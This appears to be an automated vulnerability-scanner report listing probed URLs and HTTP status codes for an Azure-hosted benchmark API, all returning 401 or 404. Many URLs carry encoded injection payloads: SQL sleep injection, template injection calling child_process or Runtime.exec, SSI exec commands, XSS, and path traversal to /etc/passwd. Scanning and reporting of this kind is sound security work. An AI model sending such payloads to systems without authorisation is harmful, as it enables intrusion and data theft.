* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/5497847135399017889
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/302074674206779306
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/5572950465475785247
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/932226849370329336
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/1551598591588904794
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/5421192348426295172
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%252Bresponse.write%2528167%252C800*365%252C474%2529%252B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252Ffinancial-plans
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%252FWEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2521--
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-benchmark-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%255Cfinancial-plans
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
